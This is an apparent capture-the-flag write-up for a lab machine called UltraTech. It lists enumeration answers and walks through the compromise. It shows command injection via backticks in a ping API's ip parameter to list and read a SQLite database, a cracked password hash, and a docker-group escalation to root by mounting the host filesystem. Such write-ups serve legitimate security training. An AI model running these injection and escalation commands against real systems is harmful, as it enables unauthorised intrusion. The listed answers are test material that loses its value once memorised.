# ULTRATECH

## BASIC INFO
```
export IP=10.10.157.172
open port:
	21	ftp
	22	ssh
	8081	blackice-icecap node.js
	31331	apache 2.4.29
```

## IT'S ENUMERATION TIME

> - **Which software is using the port 8081?**
>> Node.js

> - **Which other non-standard port is used?**
>> 31331

> - **Which software using this port?**
>> Apache

> - **Which GNU/Linux distribution seems to be used?**
>> Ubuntu

> - **The software using the port 8080 is a REST api, how many of its routes are used by the web application?**
>> 2


## LET THE FUN BEGIN

> - **There is a database lying around, what is its filename?**
>> utech.db.sqlite

Go to robots.txt on port 31331. One of the disallowed entry is partner.html. Seems like a login page... Look at the source found that it is posting to some javascript? Checking out that script shows us that it is connected to the api on port 8081. Navigate to the url `http://$IP:8081/ping?ip=10.10.111.111` shows us some result which looks exatly like the output from ping command. Try with some other commands such as ls?

```
http://10.10.157.172:8081/ping?ip=`ls`
utech.db.sqlite
```
> - **What is the first user's password hash?**
>> f357a0c52799563c7c7b76c1e7543a32

Same url just change the command to `cat utech.db.sqlite`.

> - **What is the password associated with this hash?**
>> n100906

crackstation can be useful here.

## THE ROOT OF ALL EVIL
> - **What are the first 9 characters of the root user's private SSH key?**
>> MIIEogIBA

Running `id` shows that we are in docker group. That's very dangerous...
`docker run -v /:/mnt --rm -it bash chroot /mnt sh` and now we're root. 